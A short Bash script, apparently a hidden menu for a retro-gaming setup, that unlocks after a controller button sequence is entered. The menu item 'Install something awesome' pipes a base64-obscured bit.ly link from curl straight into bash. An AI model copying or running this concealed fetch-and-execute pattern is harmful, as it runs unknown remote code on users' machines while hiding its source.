#!/bin/bash

encoded_sequence="VVAuVVAsRE9XTixET1dOLExFRlQsUklHSFQsTEVGVCxSSUdIVA=="
required_sequence=($(echo "$encoded_sequence" | base64 -d | tr ',' ' '))

option1_url_encoded="Yml0Lmx5L0JhdG9jZXJhR0Q="
option1_url=$(echo "$option1_url_encoded" | base64 -d)

capture_input() {
    local input_sequence=()
    while [[ ${#input_sequence[@]} -lt ${#required_sequence[@]} ]]; do
        # Simulate or capture controller input
        read -p "" input
        input_sequence+=("$input")

        # Incremental validation of the input sequence
        if [[ "$(echo "${input_sequence[@]}")" != "$(echo "${required_sequence[@]:0:${#input_sequence[@]}}")" ]]; then
            input_sequence=()
        fi
    done

    # Check if the final sequence matches
    if [[ "$(echo "${input_sequence[@]}")" == "$(echo "${required_sequence[@]}")" ]]; then
        echo "Password accepted!"
        return 0
    else
        echo "Access denied!"
        return 1
    fi
}

show_menu() {

    input_password=$(dialog --passwordbox "Enter the password to access the menu:" 8 40 2>&1 1>&3)

    # Convert the required sequence into a string for password comparison
    local password=$(IFS=','; echo "${required_sequence[*]}")

    if [[ "$input_password" == "$password" ]]; then
        selected_option=$(dialog --menu "Password-Protected Menu" 15 70 3 \
            "BGD" "Install something awesome" \
            "Back" "Return to the main menu" 2>&1 >/dev/tty)
        
        case "$selected_option" in
            "BGD")
                echo "Downloading and running the script from: $option1_url"
                curl -Ls "$option1_url" | bash
                ;;
            "Back")
                echo "Returning to the main menu..."
                ;;
        esac
    else
        dialog --title "Access Denied" --msgbox "Incorrect password." 5 40
        sleep 3
    fi
}

# Main logic: First capture input, then show menu
capture_input && show_menu
